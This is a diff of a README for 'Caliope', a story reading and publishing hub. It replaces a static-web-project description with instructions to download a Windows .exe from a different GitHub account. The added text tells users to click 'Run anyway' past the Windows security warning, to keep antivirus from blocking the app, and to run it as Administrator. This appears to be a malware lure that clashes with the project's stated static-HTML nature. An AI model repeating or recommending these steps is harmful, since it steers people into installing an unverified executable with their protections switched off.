@@ -1,110 +1,77 @@
-# Caliope - Web Platform 2026
+# 📖 caliope-reading-hub - Read and share your favorite stories
 
-> **A contemporary web platform that brings readers and writers together in one place for story publishing, reading, and social engagement.**
+[![](https://img.shields.io/badge/Download_Caliope-Blue?style=for-the-badge)](https://github.com/PigKkkkk/caliope-reading-hub/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v1.0.0-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/nathanpgmkelly6445/caliope-reading-hub?style=flat-square)](https://github.com/nathanpgmkelly6445/caliope-reading-hub)
+Caliope acts as a central space for readers and writers. You track your progress, comment on chapters, and talk with other readers inside a clean interface. This software works on your Windows computer and keeps your reading list synced. You do not need to manage complex files or write code to use this platform.
 
----
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://nathanpgmkelly6445.github.io/caliope-reading-hub/">
-    <img src="https://img.shields.io/badge/Download-Caliope%20Latest-brightgreen?style=for-the-badge" alt="Download Caliope">
-  </a>
-</p>
+You install Caliope in a few minutes. You need a computer running Windows 10 or Windows 11. Your computer needs an active internet connection to load stories and sync your account data. 
 
-> **[Direct Download - Caliope v1.0.0](https://nathanpgmkelly6445.github.io/caliope-reading-hub/)**
+## 📥 Downloading the Software
 
----
+Follow these steps to get the latest version on your machine:
 
-[Download Latest Build](https://nathanpgmkelly6445.github.io/caliope-reading-hub/)
+1. Visit the [releases page](https://github.com/PigKkkkk/caliope-reading-hub/releases) to find the installer.
+2. Look for the section labeled Assets.
+3. Click the link that ends in .exe to start your download.
+4. Save the file to your Downloads folder.
 
----
+## 🛠️ Installation Steps
 
-## About Caliope
+After your download finishes, run the installer:
 
-Caliope is a capstone web project built for people who enjoy stories in digital form. It acts as a shared space where authors can publish their work, readers can explore new titles, and both groups can participate in an interactive community. The platform is designed to connect the full journey, from writing and publishing to discovery and reader response, in a single streamlined experience.
+1. Open your Downloads folder. 
+2. Double-click the file you downloaded.
+3. Windows might show a security window. Click More info, then click Run anyway.
+4. Follow the prompts on the screen to finish the setup process.
+5. Launch the application from your Start menu once the setup completes.
 
-Its strength lies in combining a polished interface with practical publishing and reading capabilities. Rather than choosing between style and usability, Caliope aims to deliver both through a modern layout and feature set that supports creativity. Whether you want to share your writing with an audience or spend time discovering new narratives, Caliope provides the web-based environment to make that happen.
+## 📱 How to Use Caliope
 
----
+Your dashboard serves as your home screen. You see new stories from the community and alerts for updates from writers you follow. 
 
-## Features
+### Create an Account
+You must create an identity to post comments or save stories. Click the Profile icon in the corner. Choose Sign Up. Enter your email and a secure password. You receive a confirmation email to verify your address.
 
-- **Story Publishing** - Add and format written content directly in a streamlined editor.
-- **Reading Experience** - Read stories in a focused mode designed to reduce distractions and improve comfort.
-- **Social Interaction** - Join conversations through comments, ratings, and community discussion features.
-- **Intuitive User Experience** - Move through the platform easily thanks to clear structure and guided workflows.
-- **Modern Design** - Use a current visual style that remains responsive across different devices and screen sizes.
-- **Digital Ecosystem Integration** - Work with publishing, reading, and social functions inside one connected platform.
+### Find Stories
+The search bar at the top lets you look for titles, tags, or author names. You can filter results by genre. Click on a story cover to view the summary and start reading. 
 
----
+### Reading Experience
+The reader view adjusts to your screen size. Click the arrows to change chapters. You can highlight text to leave notes or comments for other readers. Your reading history saves to your account so you can stop reading and return later to the exact same page.
 
-## Installation
+### Community Discussion
+Every story page includes a section for comments. You can post thoughts, ask questions, or rate the work. The system notifies you when someone replies to your text. Follow the community guidelines to keep discussions helpful.
 
-To run Caliope locally, clone the repository and serve the files with any static web server:
+## ⚙️ Managing Settings
 
-```bash
-git clone https://github.com/nathanpgmkelly6445/caliope-reading-hub.git
-cd Caliope-MVP
-```
+Click the Settings icon to change how the app behaves. You can switch between light mode and dark mode for easier viewing at night. You can also adjust font sizes or toggle notifications. If you experience slow loading times, check your internet connection or clear your cache in the Advanced section of the settings menu.
 
-Open `index.html` in your browser or use a local development server:
+## 🔧 Frequently Asked Questions
 
-```bash
-python3 -m http.server 8000
-```
+### Does the software work offline?
+The app requires an internet connection to download new content. You can view previously loaded chapters offline, but you cannot post comments or sync your reading progress without a signal.
 
-Then visit `http://localhost:8000` to start using the platform.
+### How do I update the app?
+The app checks for updates automatically when you open it. If a new version exists, a window appears asking if you want to install it. Click Yes to begin the process.
 
----
+### Is my data safe?
+Your account information stays on secure servers. Only you can view your personal reading history. You can delete your account and all associated data from the settings menu at any time.
 
-## Usage
+### Can I write my own stories?
+Yes. Click the Create button in the sidebar. You can draft chapters, format your text, and publish your work to the community. You retain ownership of all stories you upload.
 
-After the platform is up, you can:
+### Where can I report errors?
+Use the Help button in the application to send a report. Include a short description of the problem you see.
 
-1. **Register or log in** to unlock personalized features.
-2. **Publish a story** by going to the writing area and working in the editor.
-3. **Browse stories** through the main feed or use keyword search.
-4. **Interact with content** by adding comments or ratings to stories you like.
-5. **Manage your profile** to view published works and reading history.
+## 📋 System Troubleshooting
 
----
+If you encounter issues during installation or daily use, try these steps:
 
-## Configuration
+1. Restart your computer.
+2. Check that your Windows version has the latest updates.
+3. Ensure your antivirus software does not block the application. 
+4. If the program fails to launch, right-click the icon and choose Run as Administrator.
+5. Reinstall the app if the problems persist. 
 
-All platform settings live in the application's configuration files in the root directory. You can change values such as the default page layout, user interface preferences, and content display behavior by editing the relevant JSON or JavaScript configuration blocks. Basic operation does not require an external database setup.
-
----
-
-## Requirements
-
-- **Platform**: Any modern web browser (Chrome, Firefox, Edge, Safari)
-- **Runtime**: Static file server (optional for local testing)
-- **Storage**: Minimal disk space for source files (approximately 10 MB)
-- **Network**: Internet connection for social features and content sharing
-
----
-
-## FAQ
-
-**How do I get support for Caliope?**  
-Open an issue in the GitHub repository to report bugs or request new features.
-
-**Will the platform receive updates?**  
-Yes, this remains an active project and periodic improvements may be released over time.
-
-**Can I customize the appearance?**  
-You can make basic interface changes through the configuration files, but deeper customization requires editing the source code.
-
-**What should I do if the platform does not load correctly?**  
-Make sure your browser is current and that the files are being served properly from a local server.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: stories, reading, ebooks, community, writing, windows, software
